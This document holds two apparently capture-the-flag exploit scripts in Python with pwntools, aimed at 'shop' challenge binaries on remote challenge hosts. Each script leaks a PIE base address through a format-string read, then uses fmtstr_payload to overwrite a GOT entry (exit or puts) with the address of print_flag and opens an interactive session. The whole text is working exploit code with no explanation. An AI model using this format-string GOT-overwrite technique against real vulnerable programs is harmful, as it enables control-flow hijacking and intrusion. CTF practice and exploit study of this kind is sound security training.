#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./shop")
context.binary = exe

# io = gdb.debug(exe.path, '')
io = process('ncat --ssl the-ingredient-shop-134ad2f55ba78e9f.challs.brunnerne.xyz 443'.split())
io.sendlineafter(b'exit\n', b'%43$p')
io.recvuntil(b'here is your choice\n')
exe.address = int(io.recvline().strip(), 16)-0x1351
print(hex(exe.got.exit), hex(exe.sym.print_flag))

payload = fmtstr_payload(8, writes={
    exe.got.exit : p64(exe.sym.print_flag)
})

io.sendlineafter(b'exit\n', payload)
io.sendlineafter(b'exit\n', b'3')

io.interactive()

----

from pwn import *             

context.log_level = 'warning' 


context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 

HOST="the-ingredient-shop-066efd6e14be7687.challs.brunnerne.xyz:443"

ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./shop-revenge"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT,ssl=True)

else:
    p = process(binary.path)    


# find PIE adresses
#p = process(binary.path)        
# for i in range (1,60):    
#     payload = f"%{i}$p".encode()
#     p.sendlineafter(b'exit',payload)            
#     try:
#         p.recvuntil(b"here is your choice\n")
#         recv=p.recvline().strip()
#         # if b'0x7' in recv:
#         warn (f"PAYLOAD: {payload} RECV: {recv}")
#     except:
#         pass


payload = b'%43$p'
p.sendlineafter(b'exit', payload)
p.recvuntil(b"here is your choice\n")
PIE = int(p.recvline().strip(),16)-0x1351
butter= PIE+0x11af
print_flag=PIE+0x1199
got_puts=PIE+0x4000

warn(f"PAYLOAD: {payload} PIE: {PIE:#x}")
warn(f"PAYLOAD: {payload} butter: {butter:#x}")
warn(f"PAYLOAD: {payload} print_flag: {print_flag:#x}")
payload = fmtstr_payload(8, {got_puts: print_flag}, write_size='byte')

warn(f"Size buffer {len(payload)}")
p.sendlineafter(b'exit', payload)

p.interactive()
